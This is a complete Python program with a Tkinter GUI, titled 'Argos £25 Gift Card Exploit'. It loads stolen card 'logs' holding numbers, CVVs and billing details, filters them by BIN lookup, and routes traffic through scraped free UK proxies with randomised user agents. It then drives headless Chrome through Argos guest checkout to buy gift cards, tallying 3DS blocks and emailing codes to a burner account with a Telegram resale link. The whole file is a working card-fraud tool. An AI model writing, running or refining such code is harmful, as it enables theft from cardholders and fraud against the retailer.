import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
import time
import random
import smtplib
from email.mime.text import MIMEText
import json
import re
import os
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from datetime import datetime

# Config
CONFIG_FILE = "config.json"
PROXY_FILE = "proxies.txt"
DEFAULT_CONFIG = {"email": "yourburner@gmail.com", "password": "yourgmailapppassword", "town": "Glasgow"}
if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, "r") as f:
        config = json.load(f)
    # Merge with defaults to handle missing keys
    config = {**DEFAULT_CONFIG, **config}
else:
    config = DEFAULT_CONFIG
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f)

ua = UserAgent()
running = False

def fetch_proxies(town):
    proxies = []
    sources = [
        f"https://www.freeproxy.world/?type=http&anonymity=&country=GB&city={town}&speed=",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=GB",
        "https://free-proxy-list.net/"
    ]

    # Source 1: freeproxy.world
    try:
        resp = requests.get(sources[0], timeout=10)
        matches = re.findall(r'(\d+\.\d+\.\d+\.\d+):(\d+)', resp.text)
        proxies.extend([f"http://{ip}:{port}" for ip, port in matches])
    except:
        pass

    # Source 2: proxyscrape.com
    try:
        resp = requests.get(sources[1], timeout=10)
        proxies.extend([f"http://{line.strip()}" for line in resp.text.splitlines() if ":" in line])
    except:
        pass

    # Source 3: free-proxy-list.net
    try:
        resp = requests.get(sources[2], timeout=10)
        matches = re.findall(r'<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>', resp.text)
        proxies.extend([f"http://{ip}:{port}" for ip, port in matches])
    except:
        pass

    # Cache and return unique
    proxies = list(set(proxies))
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            proxies.extend([line.strip() for line in f if line.strip()])
    return proxies

def test_proxy(proxy):
    try:
        resp = requests.get("https://www.argos.co.uk", proxies={"http": proxy, "https": proxy}, timeout=5)
        if resp.status_code == 200:
            with open(PROXY_FILE, "a") as f:
                f.write(f"{proxy}\n")
        return resp.status_code == 200
    except:
        return False

def setup_driver(proxy):
    options = Options()
    options.add_argument(f"user-agent={ua.random}")
    options.add_argument(f"--proxy-server={proxy}")
    options.add_argument("--headless")
    options.add_argument(f"--window-size={random.randint(1024, 1920)},{random.randint(768, 1080)}")
    driver = webdriver.Chrome(options=options)
    return driver

def send_email(subject, body, to_email=config["email"]):
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = config["email"]
    msg["To"] = to_email
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(config["email"], config["password"])
        server.send_message(msg)

def validate_card(card_num):
    url = f"https://binlist.net/json/{card_num[:6]}"
    try:
        resp = requests.get(url, timeout=5)
        data = resp.json()
        return data.get("scheme") in ["visa", "mastercard"] and data.get("country") == "GB"
    except:
        return False

def buy_argos_25_gift_card(card_num, exp, cvv, billing_info, proxy, status_text):
    for attempt in range(3):
        driver = setup_driver(proxy)
        try:
            driver.get("https://www.argos.co.uk/gift-card")
            time.sleep(random.uniform(2, 5))

            driver.find_element_by_xpath("//button[@data-amount='25']").click()
            driver.find_element_by_id("delivery-email").send_keys(config["email"])
            driver.find_element_by_xpath("//button[@id='add-to-basket']").click()
            time.sleep(random.uniform(1, 3))
            driver.find_element_by_xpath("//a[@href='/checkout']").click()

            driver.find_element_by_id("guest-checkout-button").click()
            driver.find_element_by_id("card-number").send_keys(card_num)
            driver.find_element_by_id("expiry-date").send_keys(exp)
            driver.find_element_by_id("cvv").send_keys(cvv)
            driver.find_element_by_id("billing-name").send_keys(f"{billing_info['first']} {billing_info['last']}")
            driver.find_element_by_id("billing-postcode").send_keys(billing_info["zip"])
            driver.find_element_by_xpath("//button[@type='submit']").click()

            time.sleep(random.uniform(5, 8))
            if "order-confirmation" in driver.current_url:
                code = driver.find_element_by_xpath("//span[@class='gift-card-code']").text
                send_email("Argos £25 Success", f"Card {card_num} - Code: {code}\nSell: t.me/ukgiftcards (£0.75/£1)")
                status_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Card {card_num} - £25 hit: {code} (Proxy: {proxy})\n", "success")
                return True, code
            elif "3ds" in driver.current_url.lower():
                send_email("Argos £25 3DS Hit", f"Card {card_num} triggered 3DS.")
                status_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Card {card_num} - 3DS triggered (Proxy: {proxy})\n", "fail")
                return False, "3ds"
            else:
                send_email("Argos £25 Failed", f"Card {card_num} - Attempt {attempt + 1} failed.")
                status_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Card {card_num} - Attempt {attempt + 1} failed (Proxy: {proxy})\n", "fail")
        except Exception as e:
            send_email("Argos £25 Error", f"Card {card_num} crashed: {str(e)} - Attempt {attempt + 1}")
            status_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Card {card_num} - Error: {str(e)} (Proxy: {proxy})\n", "fail")
            return False, str(e)
        finally:
            driver.quit()
        time.sleep(random.uniform(10, 20))
    return False, None

def exploit_log(log, proxy, status_text, stats, progress):
    global running
    if not running:
        return False
    card = {"number": log["card_num"], "exp": log["exp"], "cvv": log["cvv"]}
    billing = {
        "first": log["first_name"],
        "last": "last_name" in log and log["last_name"] or "",
        "address": log["address"],
        "city": log["city"],
        "state": log["state"],
        "zip": log["zip"]
    }

    if not validate_card(card["number"]):
        send_email("Card Invalid", f"Card {card['number']} - Not a valid UK Visa/MC.")
        status_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Card {card['number']} - Invalid\n", "fail")
        stats["fails"] += 1
        with open("fails.txt", "a") as f:
            f.write(f"{card['number']} - Invalid\n")
        return False

    while running:
        success, result = buy_argos_25_gift_card(card["number"], card["exp"], card["cvv"], billing, proxy, status_text)
        if success:
            stats["hits"] += 1
        else:
            stats["fails"] += 1
            if result == "3ds":
                stats["3ds"] += 1
            with open("fails.txt", "a") as f:
                f.write(f"{card['number']} - {result}\n")
            break
        time.sleep(random.uniform(15, 30))
    stats["processed"] += 1
    progress["value"] = (stats["processed"] / stats["total"]) * 100
    return True

def run_exploit(status_text, stats_labels, progress_bar):
    global running
    if running:
        messagebox.showinfo("Info", "Exploit already running!")
        return
    running = True

    status_text.delete(1.0, tk.END)
    status_text.insert(tk.END, f"Fetching proxies for {config['town']}...\n")
    proxies = fetch_proxies(config["town"])
    if not proxies:
        status_text.insert(tk.END, "No proxies from sites - checking cache...\n")
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            manual_proxy = tk.simpledialog.askstring("Manual Proxy", "No proxies found - enter one (e.g., http://1.2.3.4:8080):")
            if manual_proxy:
                proxies = [manual_proxy]
            else:
                status_text.insert(tk.END, "No proxies - exiting.\n")
                messagebox.showerror("Error", "No proxies available!")
                running = False
                return

    working_proxy = None
    for proxy in proxies:
        status_text.insert(tk.END, f"Testing proxy: {proxy}\n")
        status_text.update()
        if test_proxy(proxy):
            working_proxy = proxy
            status_text.insert(tk.END, f"Found working proxy: {proxy}\n")
            break
    if not working_proxy:
        status_text.insert(tk.END, "No working proxies - exiting.\n")
        messagebox.showerror("Error", "No working proxies found!")
        running = False
        return

    if not os.path.exists("logs.txt"):
        status_text.insert(tk.END, "No logs.txt - add logs first!\n")
        messagebox.showerror("Error", "No logs.txt found!")
        running = False
        return

    with open("logs.txt", "r") as f:
        logs = [json.loads(line.strip()) for line in f if line.strip()]
    status_text.insert(tk.END, f"Loaded {len(logs)} logs\n")
    stats = {"processed": 0, "hits": 0, "fails": 0, "3ds": 0, "total": len(logs)}
    update_stats(stats_labels, stats)

    for i, log in enumerate(logs, 1):
        if not running:
            break
        status_text.insert(tk.END, f"Processing log {i}/{len(logs)}: {log['card_num']}\n")
        exploit_log(log, working_proxy, status_text, stats, progress_bar)
        update_stats(stats_labels, stats)
        status_text.update()
        time.sleep(random.uniform(60, 300))
    running = False
    status_text.insert(tk.END, "Exploit finished.\n")

def stop_exploit():
    global running
    running = False
    messagebox.showinfo("Info", "Exploit stopped.")

def update_stats(labels, stats):
    labels["processed"].config(text=f"Processed: {stats['processed']}/{stats['total']}")
    labels["hits"].config(text=f"Hits: {stats['hits']}")
    labels["fails"].config(text=f"Fails: {stats['fails']}")
    labels["3ds"].config(text=f"3DS Blocks: {stats['3ds']}")

def add_single_log(entries):
    log = {key: entries[key].get() for key in entries}
    if not (len(log["card_num"]) == 16 and log["exp"] and len(log["cvv"]) == 3):
        messagebox.showerror("Error", "Invalid card details!")
        return
    with open("logs.txt", "a") as f:
        f.write(json.dumps(log) + "\n")
    messagebox.showinfo("Success", "Log added to logs.txt")

def add_bulk_logs(text_box):
    bulk = text_box.get("1.0", tk.END).strip()
    logs = [json.loads(line.strip()) for line in bulk.splitlines() if line.strip()]
    with open("logs.txt", "a") as f:
        for log in logs:
            if "card_num" in log and "exp" in log and "cvv" in log:
                f.write(json.dumps(log) + "\n")
    messagebox.showinfo("Success", f"Added {len(logs)} logs to logs.txt")

def view_logs(text_box):
    text_box.delete("1.0", tk.END)
    if os.path.exists("logs.txt"):
        with open("logs.txt", "r") as f:
            text_box.insert(tk.END, f.read())

def clear_logs():
    if os.path.exists("logs.txt"):
        os.remove("logs.txt")
    messagebox.showinfo("Success", "logs.txt cleared")

def save_settings(email_entry, pass_entry, town_entry):
    config["email"] = email_entry.get()
    config["password"] = pass_entry.get()
    config["town"] = town_entry.get()
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f)
    messagebox.showinfo("Success", "Settings saved")

# GUI Setup
root = tk.Tk()
root.title("Argos £25 Gift Card Exploit")
root.geometry("700x500")

notebook = ttk.Notebook(root)
notebook.pack(pady=10, expand=True)

# Tab 1: Add One Log
tab1 = ttk.Frame(notebook)
notebook.add(tab1, text="Add One Log")
fields = ["card_num", "exp", "cvv", "first_name", "last_name", "address", "city", "state", "zip"]
entries = {}
for i, field in enumerate(fields):
    ttk.Label(tab1, text=f"{field.replace('_', ' ').title()}:").grid(row=i, column=0, padx=5, pady=5)
    entries[field] = ttk.Entry(tab1)
    entries[field].grid(row=i, column=1, padx=5, pady=5)
ttk.Button(tab1, text="Add Log", command=lambda: add_single_log(entries), width=20).grid(row=len(fields), column=0, columnspan=2, pady=10)

# Tab 2: Add Bulk Logs
tab2 = ttk.Frame(notebook)
notebook.add(tab2, text="Add Many Logs")
bulk_text = scrolledtext.ScrolledText(tab2, width=60, height=15)
bulk_text.pack(pady=5)
ttk.Button(tab2, text="Add Bulk Logs", command=lambda: add_bulk_logs(bulk_text), width=20).pack(pady=5)

# Tab 3: Run Exploit
tab3 = ttk.Frame(notebook)
notebook.add(tab3, text="Exploit")
stats_frame = ttk.Frame(tab3)
stats_frame.pack(pady=5)
stats_labels = {
    "processed": ttk.Label(stats_frame, text="Processed: 0/0"),
    "hits": ttk.Label(stats_frame, text="Hits: 0"),
    "fails": ttk.Label(stats_frame, text="Fails: 0"),
    "3ds": ttk.Label(stats_frame, text="3DS Blocks: 0")
}
for i, (key, label) in enumerate(stats_labels.items()):
    label.grid(row=0, column=i, padx=10)
progress_bar = ttk.Progressbar(tab3, length=400, mode="determinate")
progress_bar.pack(pady=5)
ttk.Button(tab3, text="Start Exploit", command=lambda: run_exploit(status_text, stats_labels, progress_bar), width=20).pack(pady=5)
ttk.Button(tab3, text="Stop Exploit", command=stop_exploit, width=20).pack(pady=5)
status_text = scrolledtext.ScrolledText(tab3, width=60, height=20)
status_text.pack(pady=5)
status_text.tag_config("success", foreground="green")
status_text.tag_config("fail", foreground="red")

# Tab 4: View Logs
tab4 = ttk.Frame(notebook)
notebook.add(tab4, text="Check Logs")
view_text = scrolledtext.ScrolledText(tab4, width=60, height=20)
view_text.pack(pady=5)
ttk.Button(tab4, text="Refresh", command=lambda: view_logs(view_text), width=20).pack(pady=5)
ttk.Button(tab4, text="Clear Logs", command=clear_logs, width=20).pack(pady=5)

# Tab 5: Settings
tab5 = ttk.Frame(notebook)
notebook.add(tab5, text="Settings")
ttk.Label(tab5, text="Email:").grid(row=0, column=0, padx=5, pady=5)
email_entry = ttk.Entry(tab5)
email_entry.insert(0, config["email"])
email_entry.grid(row=0, column=1, padx=5, pady=5)
ttk.Label(tab5, text="Password:").grid(row=1, column=0, padx=5, pady=5)
pass_entry = ttk.Entry(tab5, show="*")
pass_entry.insert(0, config["password"])
pass_entry.grid(row=1, column=1, padx=5, pady=5)
ttk.Label(tab5, text="Town:").grid(row=2, column=0, padx=5, pady=5)
town_entry = ttk.Entry(tab5)
town_entry.insert(0, config.get("town", "Glasgow"))  # Fallback to Glasgow if missing
town_entry.grid(row=2, column=1, padx=5, pady=5)
ttk.Button(tab5, text="Save Settings", command=lambda: save_settings(email_entry, pass_entry, town_entry), width=20).grid(row=3, column=0, columnspan=2, pady=10)

# Exit Button
ttk.Button(root, text="Exit", command=root.quit, width=20).pack(pady=5)

root.mainloop()
